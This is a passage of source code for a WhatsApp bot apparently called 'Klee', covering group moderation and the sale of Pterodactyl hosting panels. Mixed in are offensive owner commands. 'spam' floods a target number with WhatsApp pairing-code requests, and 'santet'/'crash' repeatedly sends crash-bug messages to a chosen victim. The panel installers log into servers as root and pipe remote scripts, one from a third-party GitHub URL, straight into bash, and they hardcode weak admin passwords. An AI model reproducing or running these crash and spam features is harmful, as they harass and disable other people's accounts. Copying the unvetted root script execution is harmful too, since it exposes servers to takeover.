    pendingRequestsText += `${index + 1}. @${request.id.replace("@s.whatsapp.net", "")}\n`;
  });

  pendingRequestsText +=
    "\nTo approve a specific request, use the command '.group approve [index number]'";
  return m.reply(pendingRequestsText.trim());
}

await m.reply(approveText);
break
case "setdesc": case "setdesk": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!text) return reply(example('teksnya'))
await Klee.groupUpdateDescription(m.chat, text)
reply(`Successfully Replacing Group Description`)
}
break
case "open": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
await Klee.groupSettingUpdate(m.chat, 'not_announcement')
reply("Successfully change the group's settings to Can send messages")
}
break
case "close": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
await Klee.groupSettingUpdate(m.chat, 'announcement')
reply("Successfully change the group setting to Only admins can send messages")
}
break
case "del": case "delete": {
if (isGroup) {
if (!isOwner && !isAdmin) return KleeReply(msg.admin)
if (!m.quoted) return reply("Reply to the message you want to delete")
if (m.quoted.sender == botNumber) {
Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return KleeReply(msg.adminbot)
Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return KleeReply(msg.owner)
if (!m.quoted) return reply("Reply to the message you want to delete")
Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {
if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Successfully Dismissed ${target.split("@")[0]} As an admin of this group`)).catch((err) => reply(err.toString()))
} else return reply(example('255734'))}
break
case "promote": case "promot": {
if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`Successfully made ${target.split("@")[0]} As an admin of this group`)).catch((err) => reply(err.toString()))
} else return reply(example('255734'))}
break
case "add": case "addmember": {
if (!isGroup) return KleeReply(msg.group)
if (!args[0]) return reply(example("255734"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await Klee.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return reply("The number is not registered on WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return reply("Failed to add members, because the admin did not allow participants to add members")
var a = await Klee.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return reply(`Successfully Added ${teks.split("@")[0]} Into This Group`)
if (a[0].status == 408) return reply(`Failed to Add ${teks.split("@")[0]} into this group, because Target does not allow others to add himself to the group`)
if (a[0].status == 409) return reply(`He was already in this group!`)
if (a[0].status == 403) return reply(`Failed to Add ${teks.split("@")[0]} into this group, because Target does not allow others to add himself to the group`)
}
break
case "k": case "kick": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Klee.sendMessage(m.chat, {text: `Successfully Dispensing @${users.split("@")[0]} From this group`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('lol/@tag'))}
break
case "hidetag": case "z": case "h": {
if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!m.quoted && !text) return reply(example("reply text"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
Klee.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "t": case "tag": {
if (!isGroup) return KleeReply(msg.group)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (!text) return reply(example("hello"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
Klee.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break

case "addadmin": case "cadp":{
if (!text) return reply(example("username"))
if (!isOwner) return KleeReply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*As a result of creating an admin account panel ✅*\nAccount data has been sent to Private Chat")
} else {
orang = m.chat
}

var teks = `
*Here's Your Panel Admin Data*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}

Additional Notes
> is prohibited from distributing panels for free
> prohibited from sharing your data
> are prohibited from distributing login links
> more info contact the owner panel
`
Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/akunlo.jpg"),title: 'Data Panel Anda', body: 'mohon di jaga dengan baik',  sourceUrl: global.domain, mediaType: 1,
renderLargerThumbnail: true}}}, {quoted: qchanel})
}
break
case "addadmin2": {
if (!text) return reply(example("name, 255734x"))
if (!isOwner) return KleeReply(msg.owner)
if (!args[0]) return reply(example("name, 255734x"))
if (!text.split(",")) return reply(example("name, 255734x"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("name, 255734x"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("name, 255734x"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Klee.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Buyer's Number Is Invalid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await reply(`*Successfully created an admin account panel ✅ *nAccount data has been sent to the number ${ceknya}`)
var teks = `
*Here's your panel admin data*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}

Additional Notes
> is prohibited from distributing panels for free
> prohibited from sharing your data
> are prohibited from distributing login links
> more info contact the owner panel
`
Klee.sendMessage(ceknya, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/akunlo.jpg"),title: 'Data Panel Anda', body: 'mohon di jaga dengan baik',  sourceUrl: global.domain, mediaType: 1,
renderLargerThumbnail: true}}}, {quoted: qchanel})
}
break
case "deladmin": {
if (!isOwner) return KleeReply(msg.owner)
if (!args[0]) return reply(example("id\n\nTo view the admin id, type *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("Admin ID Not Found!")
reply(`Successfully Deleting Panel Admin *${capital(getid)}*`)
}
break
case 'spam': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!text) return reply(`*Example:* ${prefix + command} +255xxxxxx|150`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return reply("No Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
Klee.sendText(m.chat, teks, qtoko)
}
break
case "santet": case "crash": {
if (!isOwner) return KleeReply(msg.owner)
if (!text) return reply(example("255734980103,Number of bugs"))
if (!text.split(",")) return reply(example("255734980103,Number of bugs"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return reply("Target Invalid!")
if (isNaN(jumlah)) return reply("Invalid Amount!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Klee.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return reply("Target Not Registered on WhatsApp")
reply("Processing Bug Submissions . . .")
var total = Number(jumlah) + 10
for (let i = 0; i < total; i++) {
if (i == 10) reply(`Successfully processed, bug is being sent to ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break

case "cp1gbv2": case "cp2gbv2": case "cp3gbv2": case "cp4gbv2": case "cp5gbv2": case "cp6gbv2": case "cp7gbv2": case "cp8gbv2": case "cp9gbv2": case "cp10gbv2": case "cpunliv2": {
if (!jangan) return KleeReply("Group Not Registered")
if (global.apikey.length < 1) return reply("Apikey Not Found!")
if (!args[0]) return reply(example("name, 255734x"))
if (!text.split(",")) return reply(example("name, 255734x"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("name, 255734x"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("name, 255734x"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Klee.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Invalid Buyyer Number!")
global.panel2 = [buyyer, client]
var ram
var disknya
var cpu
if (command == "cp1gbv2") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv2") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv2") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv2") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv2") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv2") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv2") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv2") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv2") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv2") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!jangan) return KleeReply(" Group")
let username = global.panel2[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Successfully Create a Panel Account ✅*\nAccount data has been sent to the ${global.panel2[1].split('@')[0]}`)
var teks = `
*Successfully Create a Panel Account ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}


Additional Notes
> is prohibited from distributing panels for free
> prohibited from sharing your data
> are prohibited from distributing login links
> more info contact the owner panel
`
Klee.sendMessage(global.panel2[1], {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/akunlo.jpg"),title: 'Data Panel Anda', body: 'mohon di jaga dengan baik',  sourceUrl: global.domain, mediaType: 1,
renderLargerThumbnail: true}}}, {quoted: qchanel})
}
break

case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cpunli": {
if (!isOwner && !isReseller) return KleeReply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Not Found!")
if (!args[0]) return reply(example("nama"))
global.panel = [text.toLowerCase()]
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return KleeReply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*Successfully Create a Panel Account ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `
*Successfully Create a Panel Account ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}


Additional Notes
> is prohibited from distributing panels for free
> prohibited from sharing your data
> are prohibited from distributing login links
> more info contact the owner panel
`
Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/akunlo.jpg"),title: 'Data Panel Anda', body: 'mohon di jaga dengan baik',  sourceUrl: global.domain, mediaType: 1,
renderLargerThumbnail: true}}}, {quoted: qchanel})
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return reply("Apikey Not Found!")
if (!isOwner) return KleeReply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("No Bot Servers")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await Klee.sendMessage(m.chat, { text: messageText }, { quoted: qtoko })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return KleeReply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Not Found!")
if (!args[0]) return reply(example("idservernya\n\nTo view the Type Server ID *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return reply("*ID Server/User* Not Found")
reply(`Successfully Deleting a Panel Account *${capital(sections[0])}*`)
}
break

case "pair":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  jadibot(Klee, m, from)
}
break
case "stoppair":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  stopjadibot(Klee, from)
}
break
case "listjadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  listjadibot(Klee, m)
}



break
case 'install-panel':{
if (!isOwner) return ('owner only')
let t = text.split(',');
if (t.length < 3) return m.reply(`*Incorrect format!*\nUsage: ${prefix}install-panel ipvps,password,domain`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
conn.on('ready', () => {
          m.reply('*THE PANEL INSTALLATION PROCESS IS ONGOING, PLEASE WAIT 5-10 MINUTES*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
         if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`admin1221\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 90000));
m.reply(`*DATA PANEL ANDA*\n\n*USERNAME:* adm\n*PASSWORD:* admin12\n*LOGIN:* ${subdomain}\nNote: must Install Wings Type .install-wings\nNote: *PLEASE WAIT 1-5 MINUTES FOR THE WEB TO OPEN`)
}

break
case 'install-wings':{
if (!isOwner && !isReseller ) return ('Sorry only for lazack28')
let t = text.split(',');
if (t.length < 3) return m.reply(`*Incorrect format!*\nUsage: ${prefix}install-panel ipvps,password,domainpanel,domainnode`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
let domainnode =t[3];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
conn.on('ready', () => {
          m.reply('*THE PANEL INSTALLATION PROCESS IS ONGOING, PLEASE WAIT 5-10 MINUTES*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
          if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 90000));
m.reply(`SUCCES INSTALL WINGS PLEASE CONFIGURE`)
}

break
case 'installpanel': {
    if (!isOwner) return m.reply("Especially for Stupid Owners")
    let t = text.split(',');
    if (t.length < 5) return m.reply(`*Incorrect format!*\nUsage: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        m.reply('*THE PANEL INSTALLATION PROCESS IS ONGOING, PLEASE WAIT 5-10 MINUTES*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        m.reply('*THE WINGS INSTALLATION PROCESS IS ONGOING, PLEASE WAIT 5-10 MINUTES*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/Danzzofficialv1/Xyraa-Hosting/refs/heads/main/install.sh)';
        m.reply('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
